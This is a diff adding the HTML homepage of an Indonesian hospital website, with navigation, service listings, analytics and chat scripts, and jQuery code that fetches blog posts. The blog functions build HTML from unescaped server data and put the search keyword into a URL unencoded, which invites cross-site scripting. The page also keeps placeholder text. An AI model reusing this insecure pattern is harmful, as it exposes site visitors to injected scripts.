@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="description" content="Hotel Template">
+    <meta name="keywords" content="Hotel, unica, creative, html">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="M. Ridwan Zalbina">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Rumah Sakit Rasyyid</title>
+    <link rel="icon" href="http://rsarrasyid.id//assets/frontview/img/favicon.png" sizes="16x16" type="image/png">
+    <!-- Google Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@400;500;600&display=swap" rel="stylesheet">
+    <!-- Css Styles -->
+    <link rel="stylesheet" href="http://rsarrasyid.id//assets/frontview/css/bootstrap.min.css" type="text/css">
+    <link rel="stylesheet" href="http://rsarrasyid.id//assets/frontview/css/font-awesome.min.css" type="text/css">
+    <link rel="stylesheet" href="http://rsarrasyid.id//assets/frontview/css/flaticon.css" type="text/css">
+    <link rel="stylesheet" href="http://rsarrasyid.id//assets/frontview/css/linearicons.css" type="text/css">
+    <link rel="stylesheet" href="http://rsarrasyid.id//assets/frontview/css/owl.carousel.min.css" type="text/css">
+    <link rel="stylesheet" href="http://rsarrasyid.id//assets/frontview/css/jquery-ui.min.css" type="text/css">
+    <link rel="stylesheet" href="http://rsarrasyid.id//assets/frontview/css/nice-select.css" type="text/css">
+    <link rel="stylesheet" href="http://rsarrasyid.id//assets/frontview/css/magnific-popup.css" type="text/css">
+    <link rel="stylesheet" href="http://rsarrasyid.id//assets/frontview/css/slicknav.min.css" type="text/css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.6.0/dist/leaflet.css"
+        integrity="sha512-xwE/Az9zrjBIphAcBb3F6JVqxf46+CDLwfLMHloNu6KEQCAWi6HcDUbeOfBIptF7tcCzusKFjFw2yuvEpDL9wQ=="
+        crossorigin=""/>
+            <!-- Make sure you put this AFTER Leaflet's CSS -->
+    <link rel="stylesheet" href="http://rsarrasyid.id//assets/frontview/css/styleme.css" type="text/css">
+    <script src="https://unpkg.com/leaflet@1.6.0/dist/leaflet.js"
+    integrity="sha512-gZwIG9x3wUXg2hdXF6+rVkLF/0Vi9U8D2Ntg4Ga5I5BZpVkVxlJWbSQtXPSiUTtC0TjtGOmxa1AJPuV0CPthew=="
+    crossorigin=""></script>
+    <style>
+        .floatwa{position:fixed;width:60px;height:60px;bottom:40px;right:40px;background-color:#25d366;color:#FFF;border-radius:50px;text-align:center;font-size:30px;z-index:100;}.my-floatwa{margin-top:16px;}
+    </style>
+    <!-- Smartsupp Live Chat script -->
+    <script type="text/javascript"> 
+    var _smartsupp = _smartsupp || {};
+    _smartsupp.key = 'd875578f8c67f208e5d98e81081808de68784061';
+    window.smartsupp||(function(d) {
+    var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+    s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+    c.type='text/javascript';c.charset='utf-8';c.async=true;
+    c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+    })(document);
+    </script>
+
+    <!-- facebook pixel -->
+    <!-- Facebook Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '843960122680379');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=843960122680379&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Facebook Pixel Code -->
+    
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-166320634-1"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-166320634-1');
+    </script>
+
+</head>
+<body>
+<div class="container">
+    <div class="row" id="navcontainer" style="padding-bottom:6px;">
+        <div class="col-lg-12 col-md-12 col-xs-12">
+            <a href="http://rsarrasyid.id/"><img src="http://rsarrasyid.id/assets/frontview/img/logo3.svg"  class="logo_main"></a>
+            <div class="float-right infobar" >
+                <span><i class="lnr lnr-phone-handset"></i>&nbsp;&nbsp;<span>Fax : +1 (603)535-4592</span></span>
+                <span><i class="lnr lnr-phone-handset"></i>&nbsp;&nbsp;<span>Phone : +1 (603)535-4592</span></span>
+                <span><i class="lnr lnr-envelope"></i>&nbsp;&nbsp;<span> rs.ar.plm@gmail.com </span></span>
+                <a  href="https://api.whatsapp.com/send?phone=++6281928529335&text=Assalamu'alaikum Wr Wb" target="_blank"><span id="wa_navbar"><img src="https://image.flaticon.com/icons/svg/220/220236.svg" style="color:#ffffff;height:15px;">&nbsp;&nbsp;WhatsApp</span></a>
+            </div>
+        </div>
+    </div>
+</div>
+<section class="nav_container">
+    <div class="container">
+        <nav class="navbar navbar-expand-lg navbar-light bg-light navbar_custom">
+          <a href="http://rsarrasyid.id/"><span id="logo_mobile">RS. AR-Rasyid</span></a>
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+        
+          <div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <ul class="navbar-nav mr-auto navmain">
+              <li class="nav-item active">
+                <a class="nav-link" href="http://rsarrasyid.id/">Home <span class="sr-only">(current)</span></a>    
+              </li>
+              <li class="nav-item dropdown">
+                <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                  Profil
+                </a>
+                <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="http://rsarrasyid.id/profil/sejarah">Sejarah</a>
+                  <a class="dropdown-item" href="http://rsarrasyid.id/profil/sejarah">Direksi</a>
+                  <a class="dropdown-item" href="http://rsarrasyid.id/profil/visimisi">Visi Misi</a>
+                  <a class="dropdown-item" href="http://rsarrasyid.id/profil/pmkp">PMKP</a>
+                  <a class="dropdown-item" href="http://rsarrasyid.id/profil/rekanan">Rekanan</a>
+                  <a class="dropdown-item" href="http://rsarrasyid.id/profil/prestasi">Prestasi</a>
+                </div>
+              </li>
+              <li class="nav-item dropdown">
+                <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                    Fasilitas
+                </a>
+                <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="http://rsarrasyid.id/fasilitas/layanan">Layanan Medis</a>
+                  <a class="dropdown-item" href="http://rsarrasyid.id/fasilitas/penunjang">Fasilitas Penunjang</a>
+                </div>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="http://rsarrasyid.id/galeri">Galeri <span class="sr-only"></span></a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="http://rsarrasyid.id/artikel">Artikel <span class="sr-only"></span></a>
+              </li>
+              <!-- <li class="nav-item">
+                <a class="nav-link" href="http://rsarrasyid.id/jadwaldokter">Jadwal Dokter <span class="sr-only"></span></a>
+              </li> -->
+              <li class="nav-item dropdown">
+                <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                    Informasi
+                </a>
+                <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="http://rsarrasyid.id/jadwaldokter">Jadwal Dokter </a>
+                  <a class="dropdown-item" href="http://rsarrasyid.id/daftarpasien">Daftar Pasien</a>
+                </div>
+              </li> 
+              <li class="nav-item">
+                <a class="nav-link" href="http://rsarrasyid.id/karir">Karir <span class="sr-only"></span></a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="http://rsarrasyid.id/kontak">Kontak <span class="sr-only"></span></a>
+              </li>
+              
+            </ul>
+            <form method="GET" action="http://rsarrasyid.id//blog/blog_content_list_search">
+                <div style:display:flex; class="searchings">
+                  <input name="keyword" style="padding-left:5px;" class="search_inputs" type="text" id="search_input" placeholder="Cari Informasi">
+                  <input  class="search_btn" type="submit" value="Cari">
+                </div>
+            </form>
+          </div>
+        </nav>
+    </div>
+</section><section>
+        <div class="row">
+            <div class="col-lg-12 col-md-12 col-xs-12">
+                    <div id="carouselExampleControls" class="carousel slide" data-ride="carousel">
+                        <div class="carousel-inner">
+                            <!-- <div class="carousel-item active">
+                                <div class="carousel-caption">
+                                    <div class="carousel_content">
+                                        <h1>RS. AR-Rasyid</h1>
+                                        <p>Dengan pelayanan yang prima serta di dukung oleh tenaga medis yang berpengalaman, peralatan yang modern dan canggih.</p>
+                                    </div>
+                                </div>
+                            <img class="d-block w-100 imgslider" src="http://rsarrasyid.id/assets/frontview/img/hospital.jpg" alt="First slide">
+                            </div> -->
+                            
+                                                                    <div class="carousel-item active">
+                                            <div class="carousel-caption">
+                                                <div class="carousel_content">
+                                                    <h1>RS. AR-Rasyid</h1>
+                                                    <p>Dengan pelayanan yang prima serta di dukung oleh tenaga medis yang berpengalaman, peralatan yang modern dan canggih.</p>
+                                                </div>
+                                            </div>
+                                            <img class="d-block w-100 imgslider" src="http://rsarrasyid.id/assets/banners/hospital1.jpg" alt="First slide">
+                                        </div>
+                                                                            <div class="carousel-item ">
+                                            <div class="carousel-caption">
+                                                <div class="carousel_content">
+                                                    <h1>RS. AR-Rasyid</h1>
+                                                    <p>Dengan pelayanan yang prima serta di dukung oleh tenaga medis yang berpengalaman, peralatan yang modern dan canggih.</p>
+                                                </div>
+                                            </div>
+                                            <img class="d-block w-100 imgslider" src="http://rsarrasyid.id/assets/banners/hospital21.jpg" alt="First slide">
+                                        </div>
+                                                            </div>
+                    <a class="carousel-control-prev" href="#carouselExampleControls" role="button" data-slide="prev">
+                        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+                        <span class="sr-only">Previous</span>
+                    </a>
+                    <a class="carousel-control-next" href="#carouselExampleControls" role="button" data-slide="next">
+                        <span class="carousel-control-next-icon" aria-hidden="true"></span>
+                        <span class="sr-only">Next</span>
+                    </a>
+                    </div>
+            </div>
+        </div>
+</section>
+
+
+<section class="section_two">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 col-xs-12">
+                <center><h4 class="section_two_head">Kenapa harus Rumah Sakit Islam Ar Rasyid</h4></center>
+            </div>
+        </div>
+        <br/>
+        <br/>
+        <div class="row">
+            <div class="col-md-6">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212295.svg" height="70px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h4>Rumah Sakit Islam</h4>
+                                    <p class="card-text">This is a wider card with supporting text below as a natural lead-in to additional content. This content is a little bit longer.</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar" >
+                                    <img src="https://image.flaticon.com/icons/svg/212/212289.svg" height="70px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h4>Tenaga Medis Berpengalaman</h4>
+                                    <p class="card-text">This is a wider card with supporting text below as a natural lead-in to additional content. This content is a little bit longer.</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212298.svg" height="70px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h4>Pelayanan 24 Jam</h4>
+                                    <p class="card-text">This is a wider card with supporting text below as a natural lead-in to additional content. This content is a little bit longer.</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                <img src="https://image.flaticon.com/icons/svg/212/212286.svg" height="70px">
+                            </div>
+                            <div class="col-lg-10 col-md-10">
+                                <h4>Pelayanan Memuaskan</h4>
+                                <p class="card-text">This is a wider card with supporting text below as a natural lead-in to additional content. This content is a little bit longer.</p>
+                                <div class="d-flex justify-content-between align-items-center">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212322.svg" height="70px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h4>Peralatan yang Canggih</h4>
+                                    <p class="card-text">This is a wider card with supporting text below as a natural lead-in to additional content. This content is a little bit longer.</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/240/240411.svg" height="70px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h4>Pelayanan yang memuaskan</h4>
+                                    <p class="card-text">This is a wider card with supporting text below as a natural lead-in to additional content. This content is a little bit longer.</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section><section class="section_three">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 col-xs-12">
+                <center><h4 class="section_three_head">Layanan Kami</h4></center>
+            </div>  
+        </div>
+        <br/>
+        <br/>
+        <div class="row">
+            <div class="col-md-4">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212316.svg" height="40px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h6>Radiologi</h6>
+                                    <p class="card-text">Radiologi sebagai fasilitas penunjang, terdapat juga instalasi..</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212285.svg" height="40px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h6>Perinatologi</h6>
+                                    <p class="card-text">Radiologi sebagai fasilitas penunjang, terdapat juga instalasi..</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212329.svg" height="40px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h6>Laboratorium</h6>
+                                    <p class="card-text">Radiologi sebagai fasilitas penunjang, terdapat juga instalasi..</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212288.svg" height="40px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h6>Instalasi Rawat Jalan</h6>
+                                    <p class="card-text">Radiologi sebagai fasilitas penunjang, terdapat juga instalasi..</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212314.svg" height="40px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h6>Instalasi Rawat Inap</h6>
+                                    <p class="card-text">Radiologi sebagai fasilitas penunjang, terdapat juga instalasi..</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212283.svg" height="40px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h6>Instalasi Gawat Darurat (IGD)</h6>
+                                    <p class="card-text">Radiologi sebagai fasilitas penunjang, terdapat juga instalasi..</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212286.svg" height="40px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h6>Fisioterapi</h6>
+                                    <p class="card-text">Radiologi sebagai fasilitas penunjang, terdapat juga instalasi..</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212315.svg" height="40px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h6>Farmasi</h6>
+                                    <p class="card-text">Radiologi sebagai fasilitas penunjang, terdapat juga instalasi..</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212313.svg" height="40px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h6>EEG (Electroencepalography)</h6>
+                                    <p class="card-text">Radiologi sebagai fasilitas penunjang, terdapat juga instalasi..</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card mb-4 ">
+                    <div class="card-body">
+                        <div class="row">
+                                <div class="col-lg-2 col-md-2 col-xs-12 img_bar">
+                                    <img src="https://image.flaticon.com/icons/svg/212/212308.svg" height="40px">
+                                </div>
+                                <div class="col-lg-10 col-md-10">
+                                    <h6>CT Scan</h6>
+                                    <p class="card-text">Radiologi sebagai fasilitas penunjang, terdapat juga instalasi..</p>
+                                    <div class="d-flex justify-content-between align-items-center">
+                                    </div>
+                                </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section><section class="section_four">
+    <div class="">
+        <div class="container">
+            <div class="containerblog">
+                <div class="row">
+                    <div class="col-lg-12 col-md-12 col-xs-12">
+                        <center><div class="loaderse"></div></center>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-lg-12 col-md-12 col-xs-12">
+                        <center><h4 class="section_three_head">Informasi terkini</h4></center>
+                    </div>  
+                </div>
+                <br/>
+                <div class="row" style="margin-top:20px;" id="bloglist_container">
+                    <!-- <div class="col-md-4">
+                    <div class="card mb-4 box-shadow">
+                        <img class="card-img-top" src="http://rsarrasyid.id/assets/blog/thumb_img_default/thumb.png" alt="Card image cap" style="height:15   0px;background-size:cover;">
+                        <div class="card-body">
+                        <h5 class="blog_head">Belajar tentang Kesehatan</h5>
+                        <p class="card-text">This is a wider card with supporting text below as a natural lead-in to additional content. This content is a little bit longer.</p>
+                        <div class="d-flex justify-content-between align-items-center">
+                            <div class="btn-group">
+                                <small class="text-muted">9 mins</small>
+                            </div>
+                            <button type="button" class="btn btn-sm btn-outline-secondary">View</button>
+                        </div>
+                        </div>
+                    </div>
+                    </div> -->
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="section_footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-3 col-md-3 col-sm-12 col-xs-12">
+                <h5>Informasi</h5>
+                <ul class="list-unstyled text-small">
+                    <li class="text-muted">
+                    Jln. H.M Saleh No 2 KM 7, Palembang - Jambi
+                    </li>
+                    <li class="text-muted">
+                     Telp : (0711) 5610503
+                    </li>
+                    <li class="text-muted">
+                     Fax : (0711) 5610503
+                    </li>
+                </ul>
+            </div>
+            <div class="col-lg-3 col-md-3 col-sm-12 col-xs-12">
+                <h5>Layanan</h5>
+                <ul class="list-unstyled text-small listfooters">
+                    <li><a class="text-muted" href="#">IGD</a></li>
+                    <li><a class="text-muted" href="#">Radiologi</a></li>
+                    <li><a class="text-muted" href="#">Laboratorium</a></li>
+                    <li><a class="text-muted" href="#">Poliklinik</a></li>
+                </ul>
+            </div>
+            <div class="col-lg-3 col-md-3 col-sm-12 col-xs-12">
+                <h5>Informasi</h5>
+                <ul class="list-unstyled text-small listfooters">
+                    <li><a class="text-muted" href="#">Pengunjung</a></li>
+                    <li><a class="text-muted" href="#">H & K Pasien</a></li>
+                    <li><a class="text-muted" href="#">PMKP</a></li>
+                </ul>
+            </div>
+            <div class="col-lg-3 col-md-3 col-sm-12 col-xs-12">
+            <h5>Social</h5>
+                <div style="display:flex;float:left;margin-top:2px;" id="footer_rights2">
+                        <a href="#"><img src="https://image.flaticon.com/icons/svg/145/145802.svg" style="width:40px;"></a>
+                        <a href="#"><img src="https://image.flaticon.com/icons/svg/145/145805.svg" style="width:40px;"></a>
+                        <a href="#"><img src="https://image.flaticon.com/icons/svg/145/145812.svg" style="width:40px;"></a>
+                        <a href="#"><img src="https://image.flaticon.com/icons/svg/1384/1384060.svg" style="width:40px;"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<section class="footer_last">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-6 col-md-6 col-xs-12">
+                <p class="text-muted">Copyright © 2020. All Right Reserved. Affiliation with <a style="" href='http://marcodigitalpartner.com/'>Marco Digital Partner.</a>
+                <div class="">
+                </div>
+            </div>
+            <div class="col-lg-6 col-md-6 col-xs-12">
+                <div style="display:flex;float:right;" id="footer_rights">
+                    <a href="">Home</a>
+                    <a href="galeri">Galeri</a>
+                    <a href="karir">Karir</a>
+                    <a href="kontak">Kontak</a>
+                    <a href="kontak">Promosi</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<a id="wafloats" href="https://api.whatsapp.com/send?phone=++6281928529335&text=Assalamu'alaikum Wr Wb" class="floatwa" target="_blank"><i class="fa fa-whatsapp my-floatwa"></i></a>
+
+<!-- Js Plugins -->
+<script src="http://rsarrasyid.id//assets/frontview/js/jquery-3.3.1.min.js"></script>
+<script src="http://rsarrasyid.id//assets/frontview/js/bootstrap.min.js"></script>
+<script src="http://rsarrasyid.id//assets/frontview/js/jquery.magnific-popup.min.js"></script>
+<script src="http://rsarrasyid.id//assets/frontview/js/jquery-ui.min.js"></script>
+<script src="http://rsarrasyid.id//assets/frontview/js/jquery.nice-select.min.js"></script>
+<script src="http://rsarrasyid.id//assets/frontview/js/jquery.slicknav.js"></script>
+<script src="http://rsarrasyid.id//assets/frontview/js/owl.carousel.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.js"></script>
+<script src="http://rsarrasyid.id//assets/frontview/js/main.js"></script>
+<script>
+    $(document).ready(function(){
+        $('#containerblog').hide();
+        $('.loaderse').fadeIn(100);
+        imgviewer();
+        fetchblog();
+        lamar();
+        $('#search_submit').on('click', function(){
+            let keyword = $('#search_input').val();
+
+        });
+    });
+
+    function lamar(){
+        $('#kliklamar').on('click', function(){
+            $('#lamar').toggle();
+        });
+    }
+
+    function shorten_text(text){
+       let result = jQuery.trim(text).substring(0, 150)
+        .split(" ").slice(0, -1).join(" ") + "...";
+        return result;
+    }
+
+    function imgviewer(){
+        $('.image_container').on('click', '[data-toggle="lightbox"]', function(event) {
+            event.preventDefault();
+            $(this).ekkoLightbox();
+        });
+    }
+
+    function fetchblog_search(keyword){
+        $.ajax({
+            method: 'get',
+            url: "http://rsarrasyid.id/blog/blog_content_list_search?keyword="+keyword+"", 
+            success: function(result){
+                    console.log(result);
+                    let decode_result = JSON.parse(result);
+                    let result_url;
+                    let url_link = "http://rsarrasyid.id/";
+                    let slug = decode_result
+                    console.log(decode_result);
+                    let image_path = "";
+                    let i = 0;
+                    for(i; i < decode_result.length; i++){
+                    let cols = i + 1;
+                    result_url = url_link +'artikel/'+  decode_result[i].slug;
+                    if(decode_result[i].image_path == ""){
+                        image_path = "http://rsarrasyid.id/assets/blog/thumb_img_default/thumb.png";
+                    }else{
+                        image_path = "http://rsarrasyid.id/assets/blog/thumb_img/" + decode_result[i].image_path ;
+                    }
+                    let adapter = `
+                        <div class="col-md-4">
+                            <div class="card mb-4 box-shadow">
+                                <a href=`+result_url+`><img class="card-img-top" src=`+image_path+` alt="Card image cap" style="height:150px;background-size:cover;"></a>
+                                <div class="card-body">
+                                <a href="`+result_url+`" style="color:#000;"><h5 class="blog_head">`+decode_result[i].title+`</h5></a>
+                                <p class="card-text">`+shorten_text(decode_result[i].content)+`</p>
+                                <div class="d-flex justify-content-between align-items-center">
+                                    <div class="btn-group">
+                                        <small class="text-muted">`+decode_result[i].date_created+`</small>
+                                    </div>
+                                </div>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                    setTimeout(function(){
+                        $('#bloglist_container').append(adapter);   
+                        $('.loaderse').fadeOut(500);
+                        $('.containerblog').fadeIn(100);
+                    }, 1)
+                    }
+            }
+        });
+    }
+
+    function fetchblog(){
+        $.ajax({
+            url: "http://rsarrasyid.id/blog/blog_content_list", 
+            success: function(result){
+                    console.log(result);
+                    let decode_result = JSON.parse(result);
+                    let result_url;
+                    let url_link = "http://rsarrasyid.id/";
+                    let slug = decode_result
+                    console.log(decode_result);
+                    let image_path = "";
+                    let i = 0;
+                    for(i; i < decode_result.length; i++){
+                    let cols = i + 1;
+                    result_url = url_link +'artikel/'+  decode_result[i].slug;
+                    if(decode_result[i].image_path == ""){
+                        image_path = "http://rsarrasyid.id/assets/blog/thumb_img_default/thumb.png";
+                    }else{
+                        image_path = "http://rsarrasyid.id/assets/blog/thumb_img/" + decode_result[i].image_path ;
+                    }
+                    let adapter = `
+                        <div class="col-md-4">
+                            <div class="card mb-4 box-shadow">
+                                <a href=`+result_url+`><img class="card-img-top" src=`+image_path+` alt="Card image cap" style="height:150px;background-size:cover;"></a>
+                                <div class="card-body">
+                                <a href="`+result_url+`" style="color:#000;"><h5 class="blog_head">`+decode_result[i].title+`</h5></a>
+                                <p class="card-text">`+shorten_text(decode_result[i].content)+`</p>
+                                <div class="d-flex justify-content-between align-items-center">
+                                    <div class="btn-group">
+                                        <small class="text-muted">`+decode_result[i].date_created+`</small>
+                                    </div>
+                                </div>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                    setTimeout(function(){
+                        $('#bloglist_container').append(adapter);   
+                        $('.loaderse').fadeOut(500);
+                        $('.containerblog').fadeIn(100);
+                    }, 1)
+                    }
+            }
+        });
+    }
+</script>
+
